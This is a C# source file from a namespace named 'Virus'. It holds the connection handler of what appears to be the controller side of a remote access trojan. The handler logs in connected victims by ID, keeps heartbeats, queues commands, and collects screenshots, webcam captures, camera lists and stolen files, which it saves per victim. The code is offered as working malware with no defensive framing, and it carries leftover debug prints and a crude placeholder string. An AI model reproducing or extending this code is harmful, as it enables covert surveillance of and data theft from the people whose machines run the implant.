using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Collections.Generic;

namespace Virus {
    class Handler {
		private readonly Socket sock;
		private readonly int ID;
		private readonly Thread thd;
		private readonly Thread hbThd;
		private readonly Thread writeThd;
		
		private bool isAlive = true;
		private string recvID = string.Empty;
		private static byte[]? moarData = null;
		private System.Collections.Concurrent.BlockingCollection<Message> msgQue =
			new System.Collections.Concurrent.BlockingCollection<Message>();
		private System.Diagnostics.Stopwatch hbStopwatch = new System.Diagnostics.Stopwatch();
		
    	public Handler(Socket sock, int id) {
			this.sock = sock;
			this.ID = id;
			thd = new Thread(Start);
			thd.Start();
			hbThd = new Thread(StartHB);
			writeThd = new Thread(StartWrite);
    	}
		private void Close() {
			isAlive = false;
			writeThd.Interrupt();
			hbThd.Interrupt();
			sock.Close();
			sock.Dispose();
			Program.Remove(ID);
		}
		
		private void Start() {
			Message? login = null;
			try { login = Shared.Read(sock, ref moarData, 0); }
			catch (Exception ex) { LogErr("Encountered an exception during startup: {0}", ex); }
			if (login == null) {
				LogErr("Did not receive valid login message, terminating...");
				Close();
			} else if (!login.TryGetString(out recvID)) {
				LogErr("Could not decode LoginID into string, terminating...");
				Close();
			} else {
				LogOut("Client \"{0}\" connected, entering message loop", recvID);
				hbThd.Start();
				writeThd.Start();
			}

			while (isAlive) {
				Message? msg = null;
				try { msg = Shared.Read(sock, ref moarData); } 
				catch (SocketException ex) {
					LogErr("Connection terminated due to an exception: \"{0}\"", ex.Message);
					Close();
				}
				catch (IOException ex) {
					String filename = DateTime.Now.ToString("yyMMdd-HHmmss-")+(((byte[]?)ex.Data["msgID"])??new byte[0]).ToString();
					if (ex.HResult == 0) {
						filename += "-insteadof-"+(ex.Data["msgExpID"]??"shitofpiececompilerstopcomplaining").ToString()+".bin";
						LogErr("Received message with unexpected id: {0}", ex.Data["msgID"]);
					} else LogErr("Received message with invalid id: {0}", ex.Data["msgID"]);

					filename += ".bin";
					LogErr("Saved to {0}", filename);
					File.WriteAllBytes(filename, ((byte[]?)ex.Data["msgID"])??new byte[0]);
				}
				if (msg == null) continue;

				switch (msg.type) {
				  case Message.Type.Heartbeat:
					hbStopwatch.Stop();
					LogOut("Heartbeat after {0}ms", hbStopwatch.ElapsedMilliseconds);
					break;
				  case Message.Type.Message:
					bool str = msg.TryGetString(out string data);
					if (str)
						LogOut("Received message: \"{0}\"", data);
					else LogOut("Received message with invalid characters: \"{0}\"", Convert.ToBase64String(msg.body));
					break;
				  case Message.Type.Screenshot:
				  case Message.Type.Camerashot:
					string msgName = msg.type == Message.Type.Camerashot ? "Camera" : "Screen";
					string filename = recvID+DateTime.Now.ToString("-yyMMdd-HHmmss-")+msgName+".png";
					LogOut("Received {0}shot with size of {1}kB\nSaved to {2}", msgName, msg.body.Length/1024, filename);
					break;

				  case Message.Type.CamEnum:
					bool str2 = msg.TryGetString(out string data2);
					if (str2)
						LogOut("Received camera enumeration: \"{0}\"", data2);
					else LogOut("Received camera enumeration with invalid characters: \"{0}\"", Convert.ToBase64String(msg.body));
					break;

				  case Message.Type.F2S:
					int fnsize = BitConverter.ToInt32(msg.body.Take(4).ToArray());
					string filepath = Encoding.ASCII.GetString(msg.body.Skip(4).Take(fnsize).ToArray());
					string filename2 = Path.GetFileName(filepath);
					byte[] file = msg.body.Skip(4+fnsize).ToArray();
					LogOut("Received file by the name of \"{0}\" with size of {1}kB. Saved to {2}", filename2, file.Length, "filez\\"+recvID+"\\"+filename2);
					Directory.CreateDirectory(recvID);
					File.WriteAllBytes("filez\\"+recvID+"\\"+filename2, file);
					break;

				  default:
					break;
				}
				Console.WriteLine("test");
			}
			Console.WriteLine("test2");
		}

		private void StartHB() {
			try {
				while (isAlive) {
					Write(Message.Type.Heartbeat);
					hbStopwatch.Restart();
					Thread.Sleep(30000);
					if (hbStopwatch.IsRunning) {
						LogErr("Heartbeat not received after 30 seconds, terminating");
						Close();
					}
				}
			} catch (ThreadInterruptedException) {}
		}
		private void StartWrite() {
			try {
				while (isAlive) msgQue.Take().Send(sock);
			} catch (ThreadInterruptedException) {}
		}
		
		public void Write(Message.Type type) => msgQue.Add(new Message(type));
		public void Write(Message.Type type, string data) => msgQue.Add(new Message(type, data));
		public void Write(Message.Type type, IEnumerable<byte> data) => msgQue.Add(new Message(type, data));
		public string getName() => recvID;

		private void LogErr(string fmt, params Object?[] args) {
			Console.Error.Write("[conn #{0}] ", ID);
			Console.Error.WriteLine(fmt, args);
		}
		private void LogOut(string fmt, params Object?[] args) {
			Console.Write("[conn #{0}] ", ID);
			Console.WriteLine(fmt, args);
		}
	}
}